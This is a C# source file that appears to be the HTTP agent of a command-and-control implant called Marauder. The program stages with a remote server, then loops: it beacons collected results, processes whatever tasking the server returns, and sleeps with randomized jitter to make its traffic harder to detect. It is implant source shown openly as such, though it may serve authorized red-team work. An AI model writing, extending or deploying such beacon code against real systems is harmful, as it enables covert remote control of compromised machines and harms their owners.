using System;
using System.Threading;
using MarauderHTTP.Common;
using MarauderLib.Services;
using _marauder = MarauderLib.Marauder;

namespace MarauderHTTP
{
    internal static class Program
    {
        private static Webclient _webclient;
        internal static Configuration Configuration;

        private static void Main(string[] args)
        {

            try
            {
#if DEBUG
                Logging.Write("MarauderHTTP", "Initializing..");
#endif
                Configuration = new Configuration();
                _webclient = new Webclient();
                _marauder.Init(Configuration.PayloadName, Configuration.PayloadKey, Configuration.Sleep,
                    Configuration.Jitter, Configuration.MaxAttempts, Configuration.ExpirationDate, Configuration.Debug);
            }
            catch (Exception e)
            {
#if DEBUG
                Logging.Write("MarauderHTTP", $"Problem initializing: {e.Message}");
#endif
            }

            try
            {
                while (true)
                {
                    string message;
                    string response;

                    if (String.IsNullOrEmpty(_marauder.Id))
                    {
                        message = _marauder.Stage();
                        response = _webclient.Stage(_marauder.PayloadName, _marauder.StagingId, message);
                    }
                    else
                    {
                        message = _marauder.GetResults();
                        response = _webclient.Beacon(_marauder.Id, message);
                    }

                    if (!String.IsNullOrEmpty(response))
                    {
                        _marauder.Process(response);
                    }

                    // Start Sleep
                    double sleep = _marauder.Sleep;

                    // Here we account for jitter
                    if (_marauder.Jitter > 0 && _marauder.Jitter <= 1)
                    {
                        double offset = _marauder.Sleep * _marauder.Jitter;
                        Random random = new Random();
                        double result = random.NextDouble() * (offset - (offset * -1)) + (offset * -1);
                        sleep = sleep + result;
                    }

                    sleep = (sleep * 1000);
#if DEBUG
                    Logging.Write("MarauderHTTP", $"Sleeping for {Convert.ToInt32(sleep)} milliseconds");
#endif
                    Thread.Sleep(Convert.ToInt32(sleep));

                }
            }
            catch (Exception e)
            {
#if DEBUG
                Logging.Write("MarauderHTTP", $"Problem processing requests: {e.Message}");
#endif
            }
        }
    }
}